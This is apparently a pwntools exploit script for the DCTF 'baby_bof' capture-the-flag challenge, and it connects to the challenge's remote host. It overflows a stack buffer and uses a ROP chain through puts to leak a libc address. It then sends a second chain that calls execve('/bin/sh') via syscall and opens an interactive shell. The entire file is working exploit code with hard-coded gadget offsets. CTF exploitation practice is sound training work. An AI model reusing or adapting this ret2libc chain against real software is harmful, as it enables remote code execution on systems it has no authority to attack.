from pwn import *
import time

#c = process("./baby_bof")
c = remote("dctf-chall-baby-bof.westeurope.azurecontainer.io", 7481)
#gdb.attach(c)
pop_rdi = 0x0000000000400683

payload = b'A'*0x12
payload += p64(pop_rdi)
payload += p64(0x601018)
payload += p64(0x00000000004004a0)
payload += p64(0x00000000004005f2)

c.sendline(payload)
c.recvuntil('work\n')
data = u64(c.recv()[:6] + b'\x00\x00')
libc = data - 0x0875a0 #0x765f0
log.success('leak puts(): ' + hex(data))
log.success('libc address:' + hex(libc))

payload = b'A'*0x12
payload += p64(libc + 0x0000000000026b72) #pop rdi
payload += p64(libc + 0x1b75aa) # /bin/sh
payload += p64(libc + 0x0000000000027529) #pop rsi
payload += b'\x00'*8
payload += p64(libc + 0x0000000000162865) # pop rax rdx
payload += p64(0x3b)
payload += b'\x00'*16
payload += p64(libc + 0x000000000002584d) # syscall
c.sendline(payload)
c.interactive()
